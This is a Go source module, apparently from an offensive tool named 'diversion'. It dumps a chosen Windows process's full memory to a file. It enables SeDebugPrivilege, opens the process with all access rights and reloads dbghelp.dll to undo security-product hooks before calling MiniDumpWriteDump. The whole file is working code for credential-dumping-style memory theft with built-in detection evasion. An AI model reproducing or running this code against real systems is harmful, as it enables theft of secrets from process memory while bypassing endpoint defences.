package dump

import (
	"fmt"
	"os"

	"github.com/lum8rjack/diversion/cmd/modules"
	"golang.org/x/sys/windows"
)

// Run dbghelp.dll:MiniDumpWriteDump to dump process memory
func minidump(pid int, outfile string) error {
	// Convert PID from int to uint32
	processID := uint32(pid)

	// Get Debug privileges
	if err := modules.SePrivEnable("SeDebugPrivilege"); err != nil {
		return err
	}

	// Get handle to process
	// PROCESS_ALL_ACCESS
	processHandle, err := windows.OpenProcess(0x1F0FFF, false, processID)
	if err != nil {
		fmt.Println("Error opening process")
		return err
	}
	defer windows.CloseHandle(processHandle)
	processHandle = windows.Handle(processHandle)

	// Create file
	myFile, err := os.Create(outfile)
	if err != nil {
		return err
	}
	defer myFile.Close()

	fileHandle := uintptr(myFile.Fd())

	//MiniDumpWithFullMemory = 0x00000002
	dumpType := 0x00000002

	// Load the DLL
	dbghelp := windows.NewLazySystemDLL("dbghelp.dll")
	mdwd := dbghelp.NewProc("MiniDumpWriteDump")

	// unhook
	modules.ReloadDll("C:\\Windows\\System32\\dbghelp.dll")

	// Run function
	ret, _, err := mdwd.Call(uintptr(processHandle), uintptr(processID), fileHandle, uintptr(dumpType), uintptr(0), uintptr(0), uintptr(0))
	if ret == uintptr(1) {
		fmt.Printf("Successfully dumped memory to file: %s\n", outfile)
		err = nil
	}

	return err
}
